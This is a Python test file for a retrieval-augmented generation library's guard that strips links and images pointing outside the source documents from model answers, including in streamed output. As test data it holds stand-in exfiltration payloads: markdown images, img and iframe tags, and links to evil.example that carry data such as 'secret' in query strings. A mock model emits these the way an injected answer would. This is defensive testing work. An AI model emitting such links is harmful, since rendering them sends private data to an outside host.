"""R3: links and images in answers that point outside the sources are removed (offline)."""

from __future__ import annotations

from typing import Iterator, List

import pytest

from raglib import RAG
from raglib.guards import ExternalLinkGuard, GuardContext
from raglib.llm.base_client import BaseLLMClient
from raglib.schemas import Document

SOURCE = Document(id="d", content="Acme offices close at 5pm on Fridays. Policy: https://intranet.acme.example/policy",
                  metadata={"url": "https://news.acme.example/close"})
EVIL = "https://evil.example/q?data=secret"


def _check(text: str, guard: ExternalLinkGuard = None) -> str:
    decision = (guard or ExternalLinkGuard()).check(text, GuardContext(stage="output", documents=[SOURCE]))
    return text if decision.value is None else decision.value


@pytest.mark.parametrize("attack, kept", [
    (f"Fridays at 5pm [1]. ![log]({EVIL})", "Fridays at 5pm [1]. "),
    (f"Fridays at 5pm [1]. ![log](<{EVIL}> \"title\")", "Fridays at 5pm [1]. "),
    (f'Fridays [1]. <img src="{EVIL}">', "Fridays [1]. "),
    (f"Fridays [1]. <iframe src='{EVIL}'></iframe>", "Fridays [1]. </iframe>"),
    (f"Fridays [1]. [click here]({EVIL})", "Fridays [1]. click here"),
    (f"Fridays [1].\n[x]: {EVIL}", "Fridays [1].\n"),
    (f"Fridays [1]. See {EVIL}", "Fridays [1]. See [link removed]"),
])
def test_external_images_links_and_tags_are_removed(attack: str, kept: str) -> None:
    assert _check(attack) == kept
    assert "evil.example" not in _check(attack)


def test_links_to_the_sources_are_kept() -> None:
    text = ("Read [the policy](https://intranet.acme.example/policy) or https://news.acme.example/close. "
            "Ignore [this](https://evil.example/a).")
    assert _check(text) == ("Read [the policy](https://intranet.acme.example/policy) or https://news.acme.example/close. "
                            "Ignore this.")


def test_a_source_url_with_data_appended_is_removed() -> None:
    assert "data=" not in _check("Policy: https://intranet.acme.example/policy?data=salaries")


def test_allow_domains_keeps_links_and_images_on_those_hosts() -> None:
    guard = ExternalLinkGuard(allow_domains=["cdn.acme.example", "docs.example.org"])
    text = "![chart](https://cdn.acme.example/c.png) [docs](https://api.docs.example.org/v1) ![x](https://evil.example/p.png)"
    assert _check(text, guard) == "![chart](https://cdn.acme.example/c.png) [docs](https://api.docs.example.org/v1) "


def test_text_without_links_is_untouched() -> None:
    decision = ExternalLinkGuard().check("Fridays at 5pm [1]. Use a < b and [2].", GuardContext(stage="output", documents=[SOURCE]))
    assert decision.action == "allow"


class _Writer(BaseLLMClient):
    """Answers with a fixed text; streams it in tiny pieces that split the link in bad places."""

    def __init__(self, answer: str, pieces: List[str]) -> None:
        self.answer, self.pieces = answer, pieces

    @property
    def provider(self) -> str:
        return "test"

    def complete(self, prompt: str, system: str = "") -> str:
        return self.answer

    def chat(self, messages) -> str:
        return self.answer

    def stream(self, prompt: str, system: str = "") -> Iterator[str]:
        yield from self.pieces


ANSWER = f"Acme offices close at 5pm on Fridays [1]. ![my log](https://evil.example/q?data=Fridays) Done. See {EVIL} now."
PIECES = ["Acme offices ", "close at 5pm on Fridays [1]. ", "![my ", "log](htt", "ps://evil.", "example/q?data=Fri", "days) Done. See htt",
          "ps://evil.example/q?data=se", "cret now."]


def _rag(**kwargs) -> RAG:
    return RAG([SOURCE], chat_llm=_Writer(ANSWER, PIECES), embedding_llm="mock", token_counter="units", llm_cache=False, **kwargs)


def test_query_removes_the_injected_image_and_link_by_default() -> None:
    result = _rag().query("When do Acme offices close?")
    assert "evil.example" not in result.answer
    assert result.answer.startswith("Acme offices close at 5pm on Fridays [1].")
    assert [d["guard"] for d in result.metadata["guards"] if d["action"] == "modify"] == ["external_links"]


def test_stream_removes_links_split_across_tokens_and_keeps_streaming() -> None:
    pieces = list(_rag().stream("When do Acme offices close?"))
    shown = "".join(pieces)
    assert "evil.example" not in shown and "ps://" not in shown
    assert shown.startswith("Acme offices close at 5pm on Fridays [1].")
    assert len(pieces) >= 3  # still streamed in pieces, not held until the end


def test_it_can_be_turned_off_and_a_configured_guard_replaces_it() -> None:
    assert "evil.example" in _rag(secure_defaults={"external_links": False}).query("When do Acme offices close?").answer
    allowed = _rag(output_guards=[ExternalLinkGuard(allow_domains=["evil.example"])])
    assert [g.name for g in allowed._guards.output].count("external_links") == 1
    assert "evil.example" in allowed.query("When do Acme offices close?").answer


def test_a_plain_answer_has_no_guard_record() -> None:
    plain = RAG([SOURCE], chat_llm=_Writer("Fridays at 5pm [1].", ["Fridays ", "at 5pm [1]."]), embedding_llm="mock",
                token_counter="units", llm_cache=False)
    assert "guards" not in plain.query("When do Acme offices close?").metadata  # quiet when nothing is removed
